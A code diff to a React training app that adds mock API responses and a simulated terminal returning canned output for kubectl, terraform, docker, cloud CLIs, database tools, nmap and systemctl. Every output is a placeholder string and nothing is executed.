@@ -64,14 +64,22 @@ export function resolveWorkstationType(mission) {
 
   // Derive from sandbox
   const sb = (mission.sandbox || "").toLowerCase()
-  if (sb === "sql"  || sb === "data")           return "sql"
-  if (sb === "react"|| sb === "frontend")       return "frontend"
-  if (sb === "terminal")                        return "terminal"
-  if (sb === "notebook")                        return "notebook"
-  if (sb === "markdown" || sb === "diagram")    return "markdown"
-  if (sb === "excel"    || sb === "spreadsheet")return "excel"
-  if (sb === "dashboard"|| sb === "powerbi")    return "dashboard"
-  if (sb === "report")                          return "report"
+  if (sb === "sql"  || sb === "data")                return "sql"
+  if (sb === "react"|| sb === "frontend")            return "frontend"
+  if (sb === "terminal")                             return "terminal"
+  if (sb === "notebook")                             return "notebook"
+  if (sb === "markdown")                             return "markdown"
+  if (sb === "diagram" || sb === "system_design")    return "system_design"   // was wrongly "markdown"
+  if (sb === "excel"    || sb === "spreadsheet")     return "excel"
+  if (sb === "dashboard"|| sb === "powerbi")         return "dashboard"
+  if (sb === "report")                               return "report"
+  // Specialized consoles — pass sandbox value through directly
+  if (sb === "security_console")                     return "security_console"
+  if (sb === "soc_console")                          return "soc_console"
+  if (sb === "sre_console")                          return "sre_console"
+  if (sb === "qa_lab")                               return "qa_lab"
+  if (sb === "business_analysis")                    return "business_analysis"
+  if (sb === "medical_coding")                       return "medical_coding"
 
   // Derive from title / category / description keywords
   const text = ((mission.title || "") + " " + (mission.category || "") + " " + (mission.description || "")).toLowerCase()
@@ -312,22 +320,109 @@ function ApiWorkstation({ mission, code, onCodeChange }) {
   const sendRequest = () => {
     setSending(true)
     setBodyTab("response")
-    setTimeout(() => {
-      const mockResponse = {
-        status: 200,
-        statusText: "OK",
-        time: `${Math.floor(Math.random() * 120 + 20)}ms`,
-        headers: { "content-type": "application/json", "x-request-id": "abc123" },
-        body: JSON.stringify(
-          method === "GET"
-            ? [{ id: 1, name: "Alice", email: "alice@example.com" }, { id: 2, name: "Bob", email: "bob@example.com" }]
-            : { success: true, message: "Resource updated", id: 42 },
-          null, 2
-        ),
+
+    // Derive a realistic response from the URL path + HTTP method
+    const deriveMockBody = (urlStr, httpMethod) => {
+      let path = ""
+      try { path = new URL(urlStr).pathname } catch { path = urlStr }
+      const seg = path.replace(/^\//, "").split("/")
+      const resource = seg[0] || ""
+      const id = seg[1]
+      const isGet = httpMethod === "GET"
+      const isList = isGet && !id
+      const ts = new Date().toISOString()
+
+      // ── /users, /accounts ─────────────────────────────────────────────────
+      if (/users?|accounts?|members?|customers?/.test(resource)) {
+        if (httpMethod === "DELETE") return { success: true, message: `User ${id||1} deleted`, deletedAt: ts }
+        if (!isGet) return { id: id || Math.floor(Math.random()*9000+1000), name: "Alice Johnson", email: "alice@example.com", role: "user", createdAt: ts }
+        if (isList) return { data: [
+          { id: 1, name: "Alice Johnson", email: "alice@example.com", role: "admin", status: "active", createdAt: "2024-01-01T00:00:00Z" },
+          { id: 2, name: "Bob Smith",     email: "bob@example.com",   role: "user",  status: "active", createdAt: "2024-01-05T00:00:00Z" },
+          { id: 3, name: "Carol White",   email: "carol@example.com", role: "user",  status: "inactive",createdAt: "2024-01-10T00:00:00Z" },
+        ], total: 3, page: 1, perPage: 20 }
+        return { id: id||1, name: "Alice Johnson", email: "alice@example.com", role: "admin", status: "active", lastLogin: ts }
       }
-      setResponse(mockResponse)
+
+      // ── /orders, /transactions ────────────────────────────────────────────
+      if (/orders?|transactions?|purchases?/.test(resource)) {
+        if (!isGet) return { id: `ORD-${Math.floor(Math.random()*9000+1000)}`, status: "pending", total: 149.99, currency: "USD", createdAt: ts }
+        if (isList) return { data: [
+          { id: "ORD-1001", userId: 1, total: 149.99, status: "completed", items: 3, createdAt: "2024-01-15T10:23:00Z" },
+          { id: "ORD-1002", userId: 2, total: 89.00,  status: "pending",   items: 1, createdAt: "2024-01-15T11:40:00Z" },
+          { id: "ORD-1003", userId: 1, total: 299.50, status: "shipped",   items: 5, createdAt: "2024-01-14T08:10:00Z" },
+        ], total: 3, page: 1 }
+        return { id: id||"ORD-1001", userId: 1, total: 149.99, status: "completed", items: [
+          { productId: 42, name: "Wireless Keyboard", qty: 1, price: 79.99 },
+          { productId: 17, name: "USB Hub", qty: 2, price: 35.00 },
+        ], createdAt: "2024-01-15T10:23:00Z" }
+      }
+
+      // ── /products, /items ─────────────────────────────────────────────────
+      if (/products?|items?|catalog|inventory/.test(resource)) {
+        if (!isGet) return { id: Math.floor(Math.random()*9000+1000), name: "New Product", price: 99.99, stock: 100, createdAt: ts }
+        if (isList) return { data: [
+          { id: 1, name: "Wireless Keyboard", price: 79.99, stock: 45, category: "peripherals" },
+          { id: 2, name: "Mechanical Mouse",  price: 49.99, stock: 120, category: "peripherals" },
+          { id: 3, name: "USB-C Hub",         price: 35.00, stock: 200, category: "accessories" },
+        ], total: 3 }
+        return { id: id||1, name: "Wireless Keyboard", price: 79.99, stock: 45, category: "peripherals", sku: "KB-WL-001" }
+      }
+
+      // ── /auth, /login, /token ─────────────────────────────────────────────
+      if (/auth|login|token|refresh|signup|register/.test(resource)) {
+        if (httpMethod === "DELETE" || resource === "logout") return { success: true, message: "Logged out" }
+        return {
+          accessToken: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwibmFtZSI6IkFsaWNlIiwiaWF0IjoxNzA1MzE2ODAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
+          refreshToken: "dGhpcyBpcyBhIHJlZnJlc2ggdG9rZW4=",
+          expiresIn: 3600, tokenType: "Bearer",
+          user: { id: 1, name: "Alice Johnson", email: "alice@example.com", role: "admin" }
+        }
+      }
+
+      // ── /health, /status, /ping ───────────────────────────────────────────
+      if (/health|status|ping|ready|live/.test(resource)) {
+        return { status: "healthy", uptime: Math.floor(Math.random()*86400), version: "1.2.3",
+          checks: { database: "up", cache: "up", queue: "up" } }
+      }
+
+      // ── /metrics, /analytics, /reports ───────────────────────────────────
+      if (/metrics?|analytics?|reports?|stats?/.test(resource)) {
+        return { period: "2024-01", totalUsers: 12450, activeUsers: 8234,
+          revenue: 145230.50, orders: 3421, conversionRate: 0.034,
+          generatedAt: ts }
+      }
+
+      // ── /search ───────────────────────────────────────────────────────────
+      if (/search|query/.test(resource)) {
+        return { results: [
+          { id: 1, title: "Result 1", relevance: 0.95 },
+          { id: 2, title: "Result 2", relevance: 0.87 },
+        ], total: 2, took: "12ms" }
+      }
+
+      // ── Default ───────────────────────────────────────────────────────────
+      if (httpMethod === "DELETE") return { success: true, deletedAt: ts }
+      if (!isGet) return { id: Math.floor(Math.random()*9000+1000), success: true, message: "Created successfully", createdAt: ts }
+      return { data: [{ id: 1, name: "Resource A" }, { id: 2, name: "Resource B" }], total: 2 }
+    }
+
+    setTimeout(() => {
+      const isError = method === "DELETE" && !url.includes("/") // edge case demo
+      const statusCode = isError ? 422 : method === "POST" ? 201 : method === "DELETE" ? 204 : 200
+      const statusText = { 200: "OK", 201: "Created", 204: "No Content", 404: "Not Found", 422: "Unprocessable Entity" }[statusCode] || "OK"
+      const body = statusCode === 204 ? "" : JSON.stringify(deriveMockBody(url, method), null, 2)
+
+      setResponse({
+        status: statusCode,
+        statusText,
+        time: `${Math.floor(Math.random() * 120 + 18)}ms`,
+        size: `${body.length} B`,
+        headers: { "content-type": "application/json", "x-request-id": Math.random().toString(36).slice(2,10), "x-ratelimit-remaining": "98" },
+        body,
+      })
       setSending(false)
-    }, 800)
+    }, Math.floor(Math.random() * 400 + 400))
   }
 
   return (
@@ -388,9 +483,10 @@ function ApiWorkstation({ mission, code, onCodeChange }) {
         {bodyTab === "response" && (
           response ? (
             <div style={{ height: "100%", overflow: "auto" }}>
-              <div style={{ padding: "6px 12px", background: T.green2, borderBottom: `1px solid ${T.border}`, display: "flex", gap: 12, alignItems: "center", flexShrink: 0 }}>
-                <span style={{ fontSize: 12, fontWeight: 800, color: T.green }}>✓ {response.status} {response.statusText}</span>
+              <div style={{ padding: "6px 12px", background: response.status >= 400 ? "#FEF2F2" : T.green2, borderBottom: `1px solid ${T.border}`, display: "flex", gap: 12, alignItems: "center", flexShrink: 0 }}>
+                <span style={{ fontSize: 12, fontWeight: 800, color: response.status >= 400 ? T.red : T.green }}>{response.status >= 400 ? "✗" : "✓"} {response.status} {response.statusText}</span>
                 <span style={{ fontSize: 10, color: T.ink3 }}>⏱ {response.time}</span>
+                {response.size && <span style={{ fontSize: 10, color: T.ink3 }}>📦 {response.size}</span>}
               </div>
               <pre style={{ margin: 0, padding: "10px 14px", fontSize: 11, color: T.ink, background: T.code, overflow: "auto", flex: 1 }}>
                 {response.body}
@@ -468,25 +564,406 @@ function FrontendWorkstation({ mission, code, onCodeChange }) {
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
-// 4. TERMINAL WORKSTATION
+// 4. TERMINAL WORKSTATION — domain-aware command simulation
 // ─────────────────────────────────────────────────────────────────────────────
-const TERMINAL_RESPONSES = {
-  ls:     "Desktop  Documents  Downloads  Projects  README.md",
-  pwd:    "/home/user/workspace",
-  whoami: "user",
-  date:   () => new Date().toString(),
-  echo:   (args) => args.join(" "),
-  cat:    () => "# README\nThis is a simulated terminal environment.",
-  mkdir:  (args) => `mkdir: created directory '${args[0] || "newdir"}'`,
-  touch:  (args) => `touch: created '${args[0] || "file.txt"}'`,
-  clear:  () => "__CLEAR__",
-  help:   () => "Available: ls, pwd, whoami, date, echo, cat, mkdir, touch, clear, help, python3",
-  python3: () => "Python 3.11.0 (simulated)\n>>> ",
+
+// ── kubernetes ──────────────────────────────────────────────────────────────
+const _kubectl = (args) => {
+  const sub = args[0] || "", res = args[1] || "pods", name = args[2] || ""
+  const ns = (() => { const i = args.indexOf("-n"); return i >= 0 ? args[i+1] : "default" })()
+  if (sub === "get") {
+    if (res === "pods" || res === "pod") return `NAME                                   READY   STATUS    RESTARTS   AGE
+nginx-7c79c4bf97-x2k4n                 1/1     Running   0          2d14h
+api-server-6d4b8f9d7b-m8j2p            1/1     Running   0          5h23m
+worker-5f6b8d9c7d-k9l3q                2/2     Running   1          1d8h
+db-postgres-0                          1/1     Running   0          7d
+redis-master-0                         1/1     Running   0          3d2h`
+    if (res === "nodes" || res === "node") return `NAME             STATUS   ROLES           AGE   VERSION
+k8s-master-001   Ready    control-plane   7d    v1.29.0
+k8s-worker-001   Ready    <none>          7d    v1.29.0
+k8s-worker-002   Ready    <none>          7d    v1.29.0`
+    if (res === "deployments" || res === "deploy") return `NAME          READY   UP-TO-DATE   AVAILABLE   AGE
+nginx         3/3     3            3           7d
+api-server    2/2     2            2           5h23m
+worker        4/4     4            4           3d`
+    if (res === "svc" || res === "services") return `NAME         TYPE           CLUSTER-IP      EXTERNAL-IP    PORT(S)        AGE
+kubernetes   ClusterIP      10.96.0.1       <none>         443/TCP        7d
+nginx-svc    LoadBalancer   10.100.200.1    34.123.45.67   80:31000/TCP   7d
+api-svc      ClusterIP      10.100.200.2    <none>         3000/TCP       5h23m`
+    return `No resources found in ${ns} namespace.`
+  }
+  if (sub === "describe") return `Name:         ${name || "api-server-6d4b8f9d7b-m8j2p"}
+Namespace:    ${ns}
+Labels:       app=api-server,version=v1
+Status:       Running
+IP:           10.244.1.42
+Containers:
+  main:
+    Image:    node:20-alpine
+    Port:     3000/TCP
+    CPU:      100m / 500m   Memory: 128Mi / 512Mi
+    State:    Running (started: 5h23m ago)
+    Readiness: True (http-get :3000/health)`
+  if (sub === "logs") return `2024-01-15T10:23:14Z [INFO]  Server started on :3000
+2024-01-15T10:23:15Z [INFO]  DB pool initialized (10 conns)
+2024-01-15T10:24:01Z [INFO]  GET /api/users 200 42ms
+2024-01-15T10:24:22Z [INFO]  GET /api/health 200 3ms
+2024-01-15T10:25:00Z [ERROR] Connection timeout to redis:6379 (retry 1/3)
+2024-01-15T10:25:05Z [INFO]  Redis reconnected`
+  if (sub === "rollout") {
+    const action = args[1] || "status"
+    if (action === "status")  return `deployment "${args[2] || "api-server"}" successfully rolled out`
+    if (action === "undo")    return `deployment.apps/${args[2] || "api-server"} rolled back`
+    if (action === "restart") return `deployment.apps/${args[2] || "api-server"} restarted`
+  }
+  if (sub === "apply")  return `configmap/app-config configured\ndeployment.apps/api-server configured\nservice/api-svc unchanged`
+  if (sub === "scale")  return `deployment.apps/${name || "api-server"} scaled`
+  if (sub === "delete") return `${res}/${name || "resource"} deleted`
+  if (sub === "top") {
+    if (res === "pods") return `NAME                        CPU(cores)   MEMORY(bytes)\napi-server-6d4b8f9d7b       245m         312Mi\nworker-5f6b8d9c7d           180m         256Mi\ndb-postgres-0               88m          512Mi`
+    return `NAME             CPU(cores)   CPU%   MEMORY(bytes)   MEMORY%\nk8s-worker-001   1250m        31%    3.2Gi           82%\nk8s-worker-002   890m         22%    2.8Gi           71%`
+  }
+  if (sub === "exec")   return `root@${name || "pod"}:/app# `
+  return `kubectl controls the Kubernetes cluster manager.\n\nBasic Commands:\n  get          Display one or many resources (pods,nodes,svc,deploy,ns)\n  describe     Show details of a specific resource\n  logs         Print the logs for a container in a pod\n  exec         Execute a command in a container\n  apply        Apply a configuration to a resource\n  delete       Delete resources\n  rollout      Manage the rollout (status|undo|restart)\n  scale        Scale a deployment\n  top          Show resource usage\n\nExamples:\n  kubectl get pods -n production\n  kubectl describe pod api-server-xxx\n  kubectl logs api-server-xxx --previous\n  kubectl rollout restart deploy/api-server`
+}
+
+// ── terraform ───────────────────────────────────────────────────────────────
+const _terraform = (args) => {
+  const sub = args[0] || ""
+  if (sub === "init")     return `Initializing the backend...\nInitializing provider plugins...\n- Finding hashicorp/aws versions matching "~> 5.0"...\n- Installing hashicorp/aws v5.31.0...\n\nTerraform has been successfully initialized!`
+  if (sub === "plan")     return `Terraform will perform the following actions:\n\n  # aws_instance.web will be created\n  + resource "aws_instance" "web" {\n      + ami           = "ami-0c55b159cbfafe1d0"\n      + instance_type = "t3.micro"\n      + tags = { "Name" = "web-server", "Env" = "prod" }\n    }\n\n  # aws_security_group.web_sg will be created\n  + resource "aws_security_group" "web_sg" {\n      + ingress port 80 from 0.0.0.0/0\n      + ingress port 443 from 0.0.0.0/0\n    }\n\nPlan: 2 to add, 0 to change, 0 to destroy.`
+  if (sub === "apply")    return `aws_security_group.web_sg: Creating...\naws_security_group.web_sg: Created [id=sg-0a1b2c3d4e5f6789a]\naws_instance.web: Creating...\naws_instance.web: Still creating... [10s elapsed]\naws_instance.web: Creation complete [id=i-0a1b2c3d4e5f67890]\n\nApply complete! Resources: 2 added, 0 changed, 0 destroyed.\n\nOutputs:\npublic_ip = "34.123.45.67"`
+  if (sub === "destroy")  return `Plan: 0 to add, 0 to change, 2 to destroy.\n\nDestroy complete! Resources: 2 destroyed.`
+  if (sub === "state")    return `terraform.tfstate:\n  aws_instance.web\n  aws_security_group.web_sg\n  aws_s3_bucket.app_bucket\n  aws_iam_role.ec2_role`
+  if (sub === "validate") return `Success! The configuration is valid.`
+  if (sub === "fmt")      return `main.tf\nvariables.tf\noutputs.tf`
+  if (sub === "output")   return `public_ip = "34.123.45.67"\ndb_endpoint = "db.abc123.rds.amazonaws.com:5432"\nlb_dns = "app-lb-1234567890.us-east-1.elb.amazonaws.com"`
+  return `Usage: terraform [global options] <subcommand> [args]\n\nMain commands:\n  init          Prepare working directory\n  plan          Show changes required\n  apply         Create or update infrastructure\n  destroy       Destroy infrastructure\n  validate      Check configuration\n  fmt           Format source code\n  state         Advanced state management\n  output        Show output values`
+}
+
+// ── docker ──────────────────────────────────────────────────────────────────
+const _docker = (args) => {
+  const sub = args[0] || ""
+  if (sub === "ps")       return `CONTAINER ID   IMAGE            COMMAND             CREATED        STATUS        PORTS                    NAMES\na1b2c3d4e5f6   nginx:1.25       "/docker-entrypoint" 3 hours ago    Up 3 hours    0.0.0.0:80->80/tcp       web\nb2c3d4e5f6a1   postgres:16      "docker-entrypoint"  2 days ago     Up 2 days     5432/tcp                 db\nc3d4e5f6a1b2   redis:7.2        "docker-entrypoint"  5 hours ago    Up 5 hours    0.0.0.0:6379->6379/tcp   cache`
+  if (sub === "images")   return `REPOSITORY   TAG       IMAGE ID       CREATED        SIZE\nnginx        1.25      d8906c7d9bab   2 weeks ago    192MB\npostgres     16        2c9a2c1f12b4   3 weeks ago    432MB\nredis        7.2       7a99d02b7f34   4 weeks ago    117MB\nmyapp        latest    1f2e3d4c5b6a   5 hours ago    284MB`
+  if (sub === "build")    return `Step 1/8 : FROM node:20-alpine\n ---> a1b2c3d4e5f6\nStep 2/8 : WORKDIR /app\nStep 3/8 : COPY package*.json ./\nStep 4/8 : RUN npm ci\n ---> npm install complete (1247 packages)\nStep 5/8 : COPY . .\nStep 6/8 : RUN npm run build\n ---> Build complete\nStep 7/8 : EXPOSE 3000\nStep 8/8 : CMD ["node","dist/index.js"]\nSuccessfully built 1f2e3d4c5b6a\nSuccessfully tagged myapp:latest`
+  if (sub === "run")      return `Container started: ${Math.random().toString(36).slice(2,14)}`
+  if (sub === "stop")     return `${args[1] || "container"} stopped`
+  if (sub === "pull")     return `Pulling from ${args[1] || "nginx"}:latest\nDigest: sha256:a0b1c2d3e4f5...\nStatus: Image is up to date`
+  if (sub === "logs")     return `2024-01-15 10:23:14 [INFO]  Container started\n2024-01-15 10:23:15 [INFO]  Listening on :3000\n2024-01-15 10:24:01 [INFO]  GET /health 200 2ms\n2024-01-15 10:24:22 [INFO]  GET /api/users 200 45ms`
+  if (sub === "exec")     return `root@container:/app# `
+  if (sub === "stats")    return `CONTAINER       CPU %   MEM USAGE / LIMIT   MEM %\nweb             0.12%   42.3MiB / 512MiB    8.3%\ndb              0.88%   312MiB / 1GiB       30.5%`
+  if (sub === "inspect")  return `[{\n  "Id": "a1b2c3d4...",\n  "State": { "Status": "running", "Pid": 12345 },\n  "HostConfig": { "Memory": 536870912, "CpuQuota": 50000 }\n}]`
+  return `Usage:  docker [OPTIONS] COMMAND\n\nCommon Commands:\n  ps       List containers\n  images   List images\n  build    Build an image\n  run      Run a container\n  exec     Execute in container\n  logs     Fetch logs\n  stop     Stop containers\n  pull     Download image\n  stats    Resource usage\n  inspect  Return detailed info`
+}
+
+// ── helm ─────────────────────────────────────────────────────────────────────
+const _helm = (args) => {
+  const sub = args[0] || "", name = args[1] || "my-release"
+  if (sub === "list")      return `NAME              NAMESPACE     REVISION   STATUS    CHART\nnginx-ingress     ingress-nginx  3          deployed  ingress-nginx-4.9.0\nprometheus-stack  monitoring     1          deployed  kube-prometheus-stack-55.7\ncert-manager      cert-manager   2          deployed  cert-manager-v1.13.3`
+  if (sub === "install")   return `NAME: ${name}\nSTATUS: deployed\nREVISION: 1\nNOTES: ${name} installed successfully.`
+  if (sub === "upgrade")   return `Release "${name}" has been upgraded. STATUS: deployed  REVISION: 4`
+  if (sub === "rollback")  return `Rollback was a success! Happy Helming!`
+  if (sub === "uninstall") return `release "${name}" uninstalled`
+  if (sub === "status")    return `NAME: ${name}\nSTATUS: deployed\nREVISION: 3\nNOTES: ${name} is running.`
+  if (sub === "repo")      return `NAME             URL\nstable           https://charts.helm.sh/stable\ningress-nginx    https://kubernetes.github.io/ingress-nginx\nprometheus       https://prometheus-community.github.io/helm-charts`
+  return `The Kubernetes Package Manager\n\nCommon commands:\n  install    Install a chart\n  upgrade    Upgrade a release\n  list       List releases\n  rollback   Roll back a release\n  uninstall  Uninstall a release\n  status     Display release status\n  repo       Manage chart repositories`
+}
+
+// ── git ──────────────────────────────────────────────────────────────────────
+const _git = (args) => {
+  const sub = args[0] || ""
+  if (sub === "status")   return `On branch main\nYour branch is up to date with 'origin/main'.\n\nChanges staged:\n  modified:   src/api/routes.js\n  new file:   src/api/middleware/auth.js\n\nUntracked files:\n  tests/api.test.js`
+  if (sub === "log")      return `commit 3a4b5c6d (HEAD -> main, origin/main)\nAuthor: Developer <dev@company.com>\nDate:   Mon Jan 15 10:30:00 2024\n\n    feat: add JWT authentication middleware\n\ncommit 2b3c4d5e\nDate:   Sun Jan 14 16:45:00 2024\n\n    fix: resolve null pointer in user profile endpoint`
+  if (sub === "diff")     return `diff --git a/src/api/routes.js b/src/api/routes.js\n--- a/src/api/routes.js\n+++ b/src/api/routes.js\n@@ -15,3 +15,5 @@\n-  const users = await User.findAll()\n+  const users = await User.findAll({ limit: 100, order: [['createdAt','DESC']] })\n   res.json(users)`
+  if (sub === "commit")   return `[main 4d5e6f7] ${args.slice(2).join(" ") || "Update"}\n 2 files changed, 45 insertions(+), 3 deletions(-)`
+  if (sub === "push")     return `Enumerating objects: 5, done.\nWriting objects: 100% (3/3)\nTo github.com:company/repo.git\n   2b3c4d5..3a4b5c6  main -> main`
+  if (sub === "pull")     return `Updating 2b3c4d5..3a4b5c6\nFast-forward\n src/api/routes.js | 12 ++++++++++++`
+  if (sub === "branch")   return `* main\n  feature/auth-middleware\n  bugfix/null-pointer-fix\n  release/v2.1.0`
+  if (sub === "checkout" || sub === "switch") return `Switched to branch '${args[1] || "main"}'`
+  if (sub === "add")      return ``
+  if (sub === "stash")    return `Saved working directory and index state WIP on main: 3a4b5c6`
+  return `usage: git [--version] [--help] <command> [<args>]\n\nCommon commands:\n  add, commit, push, pull, status, log, diff, branch, checkout, stash`
+}
+
+// ── DBA commands ─────────────────────────────────────────────────────────────
+const _pg_dump = (args) => {
+  const db = args.find(a => !a.startsWith("-")) || "mydb"
+  const fmt = args.includes("-Fc") ? "compressed" : "SQL"
+  return `pg_dump: connecting to database "${db}" as user "postgres"\npg_dump: dumping table "users" (45,231 rows)\npg_dump: dumping table "orders" (183,445 rows)\npg_dump: dumping table "products" (2,847 rows)\npg_dump: dumping table "events" (1,204,031 rows)\npg_dump: saving large objects\npg_dump: ${fmt} dump complete\n${fmt === "compressed" ? `Output written to ${db}.dump (compressed, 342.6 MB)` : "SQL output written to stdout"}`
+}
+const _pg_restore = () => `pg_restore: connecting for restore\npg_restore: processing schemas\npg_restore: data for table "users": 45,231 rows\npg_restore: data for table "orders": 183,445 rows\npg_restore: creating indexes\npg_restore: running ANALYZE\npg_restore: complete (47.2 seconds)`
+const _psql = (args) => {
+  const db = args.find((a,i) => args[i-1]==="-d") || args.find(a=>!a.startsWith("-")) || "postgres"
+  return `psql (16.1)\nType "help" for help.\n\n${db}=# `
+}
+const _vacuumdb = (args) => {
+  const db = args.find(a=>!a.startsWith("-")) || "mydb"
+  return `vacuumdb: vacuuming database "${db}"\nVACUUM\nvacuumdb: analyzing database "${db}"\nANALYZE\nvacuumdb: VACUUM ANALYZE complete`
+}
+const _pg_basebackup = () => `pg_basebackup: initiating base backup, waiting for checkpoint\npg_basebackup: checkpoint completed\npg_basebackup: WAL start: 0/2000028 on timeline 1\npg_basebackup: transferring data files...\npg_basebackup: WAL end: 0/2000100\npg_basebackup: syncing data to disk...\npg_basebackup: base backup completed`
+const _mysql = (args) => {
+  const db = args.find(a=>!a.startsWith("-") && args[args.indexOf(a)-1]!=="-u") || ""
+  return `mysql: [Warning] Using a password on the command line is insecure.\nWelcome to MySQL 8.0.35 Community Server\n\n${db || "mysql"}> `
+}
+const _mysqldump = (args) => {
+  const db = args.find(a=>!a.startsWith("-")) || "mydb"
+  return `-- MySQL dump 10.13  Distrib 8.0.35, for Linux\n-- Database: ${db}\n-- Dumped at: ${new Date().toISOString()}`
+}
+const _createdb = (args) => `CREATE DATABASE\n${args[0] || "newdb"}: database created`
+const _pg_stat = () => `Name            | Seq Scans | Idx Scans | n_dead_tup\norders          | 1234      | 45678     | 23\nusers           | 456       | 12345     | 5\nproducts        | 89        | 3456      | 0`
+
+// ── AWS CLI ──────────────────────────────────────────────────────────────────
+const _aws = (args) => {
+  const svc = args[0] || "", action = args[1] || ""
+  if (svc === "ec2") {
+    if (action === "describe-instances") return `{\n  "Reservations": [{\n    "Instances": [{\n      "InstanceId": "i-0a1b2c3d4e5f67890",\n      "InstanceType": "t3.medium",\n      "State": { "Name": "running" },\n      "PublicIpAddress": "34.123.45.67",\n      "Tags": [{ "Key": "Name", "Value": "web-server-prod" }]\n    }]\n  }]\n}`
+    if (action === "describe-security-groups") return `{\n  "SecurityGroups": [{\n    "GroupId": "sg-0a1b2c3d",\n    "GroupName": "web-sg",\n    "Description": "Allow web traffic",\n    "IpPermissions": [{ "FromPort": 80, "ToPort": 80, "IpRanges": [{ "CidrIp": "0.0.0.0/0" }] }]\n  }]\n}`
+  }
+  if (svc === "s3") {
+    if (action === "ls") return `2024-01-10 09:30:00 my-app-bucket\n2024-01-08 14:20:00 my-app-logs\n2024-01-05 11:00:00 my-app-backups`
+    if (action === "cp") return `upload: ./file.txt to s3://${args[2] || "my-bucket"}/file.txt`
+    if (action === "sync") return `upload: src/index.html to s3://my-app-bucket/\nupload: src/styles.css to s3://my-app-bucket/\nCompleted 2 of 2 file(s)`
+    if (action === "mb") return `make_bucket: ${args[2] || "my-new-bucket"}`
+  }
+  if (svc === "lambda") {
+    if (action === "invoke") return `{\n  "StatusCode": 200,\n  "ExecutedVersion": "$LATEST"\n}`
+    if (action === "list-functions") return `{\n  "Functions": [\n    { "FunctionName": "processOrder", "Runtime": "nodejs20.x", "MemorySize": 256 },\n    { "FunctionName": "sendEmail", "Runtime": "python3.12", "MemorySize": 128 }\n  ]\n}`
+    if (action === "update-function-code") return `{\n  "FunctionName": "${args[3] || "myFunction"}",\n  "CodeSize": 12345,\n  "LastModified": "${new Date().toISOString()}",\n  "State": "Active"\n}`
+  }
+  if (svc === "sts" && action === "get-caller-identity") return `{\n  "UserId": "AIDIODR4TAW7CSEXAMPLE",\n  "Account": "123456789012",\n  "Arn": "arn:aws:iam::123456789012:user/developer"\n}`
+  if (svc === "cloudwatch") return `{\n  "MetricDataResults": [{\n    "Values": [45.2, 48.7, 52.1],\n    "Label": "CPUUtilization"\n  }]\n}`
+  if (svc === "configure") return `AWS Access Key ID: ****EXAMPLE\nDefault region: us-east-1\nOutput format: json`
+  if (svc === "ecs") return `Service updated: ${action} complete`
+  if (svc === "rds") {
+    if (action === "describe-db-instances") return `{\n  "DBInstances": [{\n    "DBInstanceIdentifier": "prod-db",\n    "DBInstanceClass": "db.t3.medium",\n    "Engine": "postgres",\n    "EngineVersion": "16.1",\n    "DBInstanceStatus": "available",\n    "Endpoint": { "Address": "prod-db.abc123.us-east-1.rds.amazonaws.com", "Port": 5432 }\n  }]\n}`
+  }
+  return `AWS CLI v2.15.0\n\nAvailable services: ec2, s3, rds, lambda, ecs, eks, cloudwatch, iam, sts, cloudformation, sqs, sns\n\nUsage: aws <service> <action> [options]\nExamples:\n  aws ec2 describe-instances\n  aws s3 ls\n  aws lambda list-functions\n  aws sts get-caller-identity`
+}
+
+// ── Azure CLI ─────────────────────────────────────────────────────────────────
+const _az = (args) => {
+  const svc = args[0] || "", action = args[1] || ""
+  if (svc === "aks") {
+    if (action === "get-credentials") return `Merged "prod-cluster" as current context in /home/user/.kube/config`
+    if (action === "list") return `[\n  { "name": "prod-cluster", "location": "eastus", "kubernetesVersion": "1.29.0", "agentPoolProfiles": [{ "count": 3, "vmSize": "Standard_D2_v2" }] }\n]`
+    if (action === "nodepool") return `Node pool operation: ${args[2] || "list"} complete`
+    if (action === "upgrade") return `Kubernetes upgrading to ${args.find((a,i) => args[i-1]==="-k") || "1.30.0"}...`
+  }
+  if (svc === "vm") {
+    if (action === "list") return `[\n  { "name": "web-vm-001", "location": "eastus", "powerState": "running", "size": "Standard_D2_v2" },\n  { "name": "db-vm-001",  "location": "eastus", "powerState": "running", "size": "Standard_D4_v2" }\n]`
+    if (action === "create") return `VM creation complete: ${args[args.indexOf("--name")+1] || "my-vm"}`
+  }
+  if (svc === "storage") return `Storage operation ${action}: complete`
+  if (svc === "group") {
+    if (action === "list") return `[\n  { "name": "prod-rg", "location": "eastus" },\n  { "name": "dev-rg",  "location": "westus2" }\n]`
+    if (action === "create") return `Resource group created: ${args.find((a,i) => args[i-1]==="--name") || "my-rg"}`
+  }
+  if (svc === "login") return `[{ "cloudName": "AzureCloud", "name": "Production Subscription", "state": "Enabled" }]`
+  if (svc === "account") return `[\n  { "name": "Production", "id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx", "isDefault": true }\n]`
+  return `Azure CLI 2.56.0\n\nAvailable services: vm, aks, storage, group, login, account, network, webapp, functionapp\n\nUsage: az <service> <action> [options]\nExamples:\n  az aks get-credentials --resource-group rg --name cluster\n  az vm list\n  az group list`
+}
+
+// ── Cyber/SRE system commands ─────────────────────────────────────────────────
+const _nmap = (args) => {
+  const target = args.find(a=>!a.startsWith("-")) || "192.168.1.1"
+  return `Starting Nmap 7.94 at ${new Date().toLocaleString()}\nNmap scan report for ${target}\nHost is up (0.012s latency).\n\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 8.9p1\n80/tcp   open  http     nginx 1.25.3\n443/tcp  open  ssl/http nginx 1.25.3\n8080/tcp open  http-alt Node.js express\n3306/tcp open  mysql    MySQL 8.0.35\n\nNmap done: 1 IP address (1 host up) scanned in 12.34 seconds`
+}
+const _systemctl = (args) => {
+  const sub = args[0] || "", svc = args[1] || "nginx"
+  if (sub === "status")  return `● ${svc}.service - ${svc}\n   Loaded: loaded (/lib/systemd/system/${svc}.service; enabled)\n   Active: active (running) since Mon 2024-01-15 10:00:00 UTC; 2h ago\n Main PID: 1234\n   Tasks: 4\n  Memory: 12.3M\n  CGroup: /system.slice/${svc}.service`
+  if (sub === "restart") return `Restarting ${svc}.service...`
+  if (sub === "stop")    return `Stopping ${svc}.service...`
+  if (sub === "start")   return `Starting ${svc}.service...`
+  return `systemctl ${sub} complete`
+}
